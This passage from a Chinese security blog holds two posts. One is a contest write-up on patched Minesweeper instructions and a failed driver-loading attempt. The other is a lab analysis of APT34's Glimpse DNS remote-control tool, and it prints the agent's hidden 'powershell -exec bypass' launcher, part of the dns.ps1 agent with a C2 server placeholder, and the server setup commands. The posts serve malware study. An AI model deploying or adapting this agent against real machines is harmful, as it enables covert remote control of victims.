<h1 id="0x02-ring3"><a href="#0x02-ring3" class="headerlink" title="0x02 ring3"></a>0x02 ring3</h1><h3 id="1-题目要求"><a href="#1-题目要求" class="headerlink" title="1. 题目要求"></a>1. 题目要求</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">winmine.exe是一个扫雷游戏程序，winmine.dmp是该程序的一份进程dump, 在这份dump中，winmine.exe的内存映像有指令被篡改，篡改实现了外挂功能。</span><br><span class="line"><span class="number">1</span>, 请找出dump中，winmine.exe的内存映像中<span class="number">2</span>处被篡改实现外挂功能的指令（被篡改指令的偏移、篡改前后的指令分别是什么），并分析这些指令篡改所实现的外挂功能是什么。（<span class="number">4</span>分）</span><br><span class="line"><span class="number">2</span>, 请提供文档，详细描述解题过程，如涉及编写程序，必须提供源代码。（<span class="number">1</span>分）</span><br></pre></td></tr></table></figure>
<h3 id="2-初步分析"><a href="#2-初步分析" class="headerlink" title="2. 初步分析"></a>2. 初步分析</h3><ul>
<li>通过OD打开winmine.exe，定位代码块，冲上往下看到的第一条指令开始地址为0100140C<br><br>  <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/1.png" alt="pic"></li>
<li>然后用010editor打开winmine.dmp文件，匹配代码开始处二进制“55 8B EC 83 EC 2C 8B 45 08 0F B7 C8 C1 E8 10 89”，找到一处匹配项，将接下来的4000h大小的二进制串（代码块在内存中为4000h）保存下来，用sbulime打开，保存为dump</li>
<li>将本机的winmine.exe的内存dump下来，保存为mywinmine.dmp，通过同样的操作，用sublime保存4000H二进制串，保存为mydump</li>
<li>用sublime的diff插件比较两块代码的区别，找到代码段四处不同处<br><br>  <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/2.png" alt="pic"></li>
<li>经过分析，第一处不同是因为我之前设置了断点，所以E8变为CC，排除；第四处不同是由于加入4000H偏移，数据已经进入数据段，排除。现在还剩两处不同<h3 id="3-定位不同点"><a href="#3-定位不同点" class="headerlink" title="3. 定位不同点"></a>3. 定位不同点</h3><h4 id="3-1-第一处不同点："><a href="#3-1-第一处不同点：" class="headerlink" title="3.1 第一处不同点："></a>3.1 第一处不同点：</h4>01002FF5处<strong>FF 05 9C 57 00 01</strong>变为<strong>90 90 90 90 90 90</strong>，汇编指令inc dword ptr ds:[0x100579C]变为nop<br><br>  <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/3.png" alt="pic"><br></li>
</ul>
<p><strong>外挂功能：</strong>可以让扫雷的计时器停止，永远为1s，此处inc指令代表+1，判断调用了系统dll的时钟函数，用来记录时间，当用nop代替后，时间记录生效。<br><br>    <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/4.png" alt="pic"><br></p>
<h4 id="3-2-第二处不同点："><a href="#3-2-第二处不同点：" class="headerlink" title="3.2 第二处不同点："></a>3.2 第二处不同点：</h4><p>01003591处<strong>6A 00</strong>变为<strong>EB 1D</strong>，汇编指令push 0变为jmp short winmine.010035B0,变化前如下图<br><br>    <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/5.png" alt="pic"><br><br>变化后，如下图<br><br>    <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/6.png" alt="pic"><br><br><strong>外挂功能：</strong>正常的扫雷，当我们点击到地雷时，本局游戏会结束，然而此处代码通过一个jmp指令，没有调用结束模块，让我们能够继续进行本局游戏，示例图如下<br><br>    <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/7.png" alt="pic"><br><br>自此，签到题结束</p>
<h1 id="0x03-ring0"><a href="#0x03-ring0" class="headerlink" title="0x03 ring0"></a>0x03 ring0</h1><h3 id="1-题目要求-1"><a href="#1-题目要求-1" class="headerlink" title="1. 题目要求"></a>1. 题目要求</h3><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">DriverDemo.sys是一个驱动程序，它内置了一些限制。</span><br><span class="line"><span class="number">1</span>, 不能篡改该文件，尝试使驱动成功加载。（<span class="number">3</span>分）</span><br><span class="line"><span class="number">2</span>, 该驱动程序成功加载后，突破它的限制，但不允许patch文件或内存，使它成功打印出（用dbgview可接受）调试信息<span class="string">"hello world!"</span>.（<span class="number">2</span>分）</span><br></pre></td></tr></table></figure>
<h3 id="2-初步分析-1"><a href="#2-初步分析-1" class="headerlink" title="2. 初步分析"></a>2. 初步分析</h3><ul>
<li>设置Windows 10虚拟机高级启动选项，禁用驱动程序强制签名</li>
<li>最开始没用管理员权限打开，viewdbg不能捕获内核，google后新建注册项，在下图所示路径新建<strong>DWORD=0xf</strong>，后来突然想起没给viewdbg管理员权限，给了之后可以捕获内核（可能是管理员权限或者是注册表原因）<br><br>  <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/8.png" alt="pic"><br></li>
<li>编写DriverDemo.inf文件，在win10虚拟机下安装DriverDemo.sys<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Version]</span><br><span class="line">signature       =  "$Windows NT$"               </span><br><span class="line">;这个是必须的,也可以换成WIndows95 和nT,但是这个最好,它表示windows</span><br><span class="line">Class    =  NULL      ;属于什么类型，这里是没有</span><br><span class="line">ClassGuid   =  &#123;00000000-0000-0000-0000-000000000000&#125;  </span><br><span class="line">;该类型的类型id，这里全填0</span><br><span class="line">Provider   =  %NULL%                                      ;提供商的名称</span><br><span class="line">DriverVer       =  04/01/2020,1.0.0.1                  ;驱动的版本号</span><br><span class="line"></span><br><span class="line">[DestinationDirs]</span><br><span class="line">DriverDemo.DriverFiles      = 12     ;%windir%\system32\drivers</span><br><span class="line">;12代表%windir%\system32\drivers这个目录，意思就是将DriverDemo.DriverFiles中的内容拷贝到%windir%\system32\drivers中</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line">;; Default install sections</span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">[DefaultInstall]</span><br><span class="line">CopyFiles           = DriverDemo.DriverFiles</span><br><span class="line">;CopyFiles是内建命令,表示拷贝将等号右边的节里面的文件拷贝到目的地</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[DefaultInstall.Services]</span><br><span class="line">AddService          = %DriverDemoServiceName%,,DriverDemo.Service</span><br><span class="line">;AddService是内建命令,表示找右边来新建服务.</span><br><span class="line">;%DriverDemoServiceName%这个是服务的名称，加%表示在string section中，DriverDemo.Service代表下面的节点名称</span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line">;; Default uninstall sections</span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">[DefaultUninstall]</span><br><span class="line">DelFiles   = DriverDemo.DriverFiles</span><br><span class="line">;DelFiles表示卸载时删除文件</span><br><span class="line"></span><br><span class="line">[DefaultUninstall.Services]</span><br><span class="line">DelService = DriverDemo,0x200    ; Flags note to stop service first</span><br><span class="line">;删除服务，在删除服务前，先停止服务</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line">; Services Section</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">[DriverDemo.Service]</span><br><span class="line">DisplayName      = %DriverDemoServiceName%      ;系统服务中显示的名称</span><br><span class="line">Description      = %DriverDemoServiceDesc%      ;系统服务中描述的名称</span><br><span class="line">ServiceBinary    = %12%\DriverDemo.sys  ;%windir%\system32\drivers\filespy.sys</span><br><span class="line">ServiceType      = 1      ;SERVICE_KERNEL_DRIVER</span><br><span class="line">StartType        = 3      ;SERVICE_DEMAND_START，手动启动</span><br><span class="line">ErrorControl     = 1      ;SERVICE_ERROR_NORMAL</span><br><span class="line"></span><br><span class="line">;</span><br><span class="line">; Copy Files</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">[DriverDemo.DriverFiles]</span><br><span class="line">DriverDemo.sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">;;</span><br><span class="line">;; String Section</span><br><span class="line">;;</span><br><span class="line"></span><br><span class="line">[Strings]</span><br><span class="line">Jason          = "Jason"</span><br><span class="line">DriverDemoServiceDesc = "DriverDemo.Inf"</span><br><span class="line">DriverDemoServiceName = "DriverDemo"</span><br><span class="line">DriverDemoRegistry    = "system\currentcontrolset\services\DriverDemo"</span><br></pre></td></tr></table></figure></li>
<li>由于在inf文件中创建了DriverDemo名字的服务，故用管理员权限打开cmd，开启服务<br><br>  <img src="/blog/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2020PC%E6%96%B9%E5%90%91%E5%88%9D%E8%B5%9B/9.png" alt="pic"><br><br>  安装失败，开始windbg双机调试</li>
</ul>
<h3 id="3-双机调试"><a href="#3-双机调试" class="headerlink" title="3. 双机调试"></a>3. 双机调试</h3><p>在搭建好双机调试环境之后，开始对DriverDemo.sys进行调试，但由于自己对于驱动调试不熟悉，只能做到双机调试虚拟机里面的用户态程序。google后，捣鼓了一段时间，作品提交时间截止，就暂且搁置了，后面要做其他实验，就把虚拟机给还原了，暂时不碰驱动调试。</p>
]]></content>
      <categories>
        <category>竞赛</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>APT34 Glimpse 工具初探</title>
    <url>/blog/APT34-Glimpse/</url>
    <content><![CDATA[<h1 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h1><p>这阵子接到一个任务，需要我对powershell无文件攻击进行分析。在找了一圈资料之后，最后决定对APT34（带有伊朗背景）的远程powershell工具Glimpse进行分析，虽然最后的结果并不完美，暂且记录一下。</p>
<a id="more"></a>

<h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzIwMjA5My5odG1s" title="https://www.freebuf.com/column/202093.html">APT34攻击样本分析-绿盟<i class="fa fa-external-link"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrb3JiaXJkL0FQVF9SRVBPUlQvdHJlZS9tYXN0ZXIvQVBUMzQ=" title="https://github.com/blackorbird/APT_REPORT/tree/master/APT34">APT34工具Github<i class="fa fa-external-link"></i></span></p>
<h1 id="0x01-Glimpse概述"><a href="#0x01-Glimpse概述" class="headerlink" title="0x01 Glimpse概述"></a>0x01 Glimpse概述</h1><p>该工具利用DNS协议进行通信，可以在agent端和server端传输指令信息，是一款远程控制工具。主要包括三个部分：agent、panel、server</p>
<ol>
<li>agent<br>agent为受控端，包含1个vbs脚本和3个ps1脚本<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">runner_.vbs 用于启动ps1脚本</span><br><span class="line">dns.psl 用于与服务端通信</span><br><span class="line">dns_main.psl 用于与服务端通信</span><br><span class="line">refineddns_main.ps1 用于与服务端通信</span><br></pre></td></tr></table></figure></li>
<li>panel<br>panel是服务器端可视化工具，可以对通信信息进行监视<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">newPanel-dbg.exe 可视化程序</span><br><span class="line">ToggleSwitch.dll 用来处理信息交互</span><br></pre></td></tr></table></figure></li>
<li>server<br>server是服务器端，接收并解析agent端的DNS请求，向agent端下发指令<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">srvr.js 用来处理信息交互的js脚本</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><p>首先创建了两台虚拟机，win7（<strong>192.168.48.131</strong>）和win10（<strong>192.168.48.129</strong>）。然后配置虚拟网络映射器，使两台虚拟机组网后位于同一局域网络，并且与主机不在同一局域网 <strong>（样本有风险，实验环境应该与外网和主机隔离）</strong>，关闭防火墙，保证两台虚拟机之间能ping通。<br><br>    win7 ping win10<br><br>    <img src="/blog/APT34-Glimpse/7t10.png" alt><br><br>    win10 ping win7<br><br>    <img src="/blog/APT34-Glimpse/10to7.png" alt></p>
<h1 id="0x03-实验分析"><a href="#0x03-实验分析" class="headerlink" title="0x03 实验分析"></a>0x03 实验分析</h1><p>分为3个部分：<strong>agent、server、panel</strong></p>
<ol>
<li><p>agent – win7 192.168.48.131<br><br>修改runner_.vbs脚本内容,将<strong>AGENT PATH</strong>改为实际文件路径，这里我改为同文件目录的dns.ps1</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set sh=CreateObject("Wscript.Shell")</span><br><span class="line">sh.Run "powershell -exec bypass -file &lt;AGENT PATH&gt;", 0, False</span><br></pre></td></tr></table></figure>
<p>修改dns.ps1文件，修改server地址（这里我改为win10的ip 192.168.48.129）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">MMC = <span class="string">"&lt;MALICIOUS SERVER&gt;"</span>; <span class="comment">#填写服务器地址</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">NNC = <span class="variable">$env</span>:PUBLIC + <span class="string">"\Libraries"</span>;</span></span><br><span class="line">if (-not (Test-Path $NNC)) &#123; md $NNC; &#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">OOC = <span class="variable">$NNC</span> + <span class="string">"\quid"</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">PPC = <span class="variable">$NNC</span> + <span class="string">"\lock"</span>;</span></span><br><span class="line">if (!(Test-Path $PPC))&#123;sc -Path $PPC -Value $pid;&#125;</span><br><span class="line">else</span><br><span class="line"> &#123;</span><br><span class="line">     $QQC = (NEW-TIMESPAN -Start ((Get-ChildItem $PPC).CreationTime) -End (Get-Date)).Minutes</span><br><span class="line">     if ($QQC -gt 10)</span><br><span class="line">     &#123;</span><br><span class="line">         stop-process -id (gc $PPC);</span><br><span class="line">         ri -Path $PPC;</span><br><span class="line">     &#125;</span><br><span class="line">     return;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>双击运行runner_.vbs脚本，它会启动dns.ps1脚本，在C:\Users\Public目录下新建Libraries文件夹，其文件树结构如下，除了生成两个文件夹以外，还生成了一个quid文件（内容为uid，即此处的198320f4c4）<br><br><img src="/blog/APT34-Glimpse/run.png" alt><br></p>
</li>
<li><p>server – win10 192.168.48.129<br>安装<span class="exturl" data-url="aHR0cHM6Ly9ub2RlanMub3JnL2VuLw==" title="https://nodejs.org/en/">nodejs<i class="fa fa-external-link"></i></span><br>创建一个项目文件夹（这里我的是APT34_RCE），将服务端文件srvr.js复制到当前路径，初始化nodejs项目</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure>
<p>在当前文件夹路径安装相关依赖包（npm国外源很慢，可以换cnpm用国内taobao源）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install --save body-parser cookies child_process dnsd webix express ip fs path sqlite3 http portscanner child_process async ejs express-fileupload dateformat multer file-base64 flat-file-db moment busboy</span><br><span class="line">npm install --save -g forever</span><br></pre></td></tr></table></figure>
<p>cmd打开当前路径，开启server（下面的命令会让服务端持久运行）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">forever start srvr.js</span><br></pre></td></tr></table></figure>
<p>它会在目录C:\ProgramData下创建文件夹Glimpse，用来保存与agent的通信信息<br><br><img src="/blog/APT34-Glimpse/port.png" alt><br><br><strong>服务端的理想情况是监听本机ip的53端口，但自己测试的时候，用netstat -ano | findstr 53命令查找53端口，其并没有在监听。网上找到的攻击成功的截图都来自原作者的telegram</strong></p>
</li>
<li><p>panel<br>在图形化面板panel模块，也没有得到agent与server的通信信息<br><br><img src="/blog/APT34-Glimpse/visual.png" alt></p>
</li>
</ol>
<h1 id="0x04-自闭"><a href="#0x04-自闭" class="headerlink" title="0x04 自闭"></a>0x04 自闭</h1><p>花了一天的时间去找问题，目前还没有解决…开始自闭…<br><br><strong>怀疑是以下原因</strong></p>
<ol>
<li>两台虚拟机均没有连接外网，DNS解析maybe失败</li>
<li>agent和server配置出错</li>
<li>该工具本身不完整</li>
</ol>
]]></content>
      <categories>
        <category>APT</category>
      </categories>
      <tags>
        <tag>APT34</tag>
        <tag>Glimpse</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
</search>
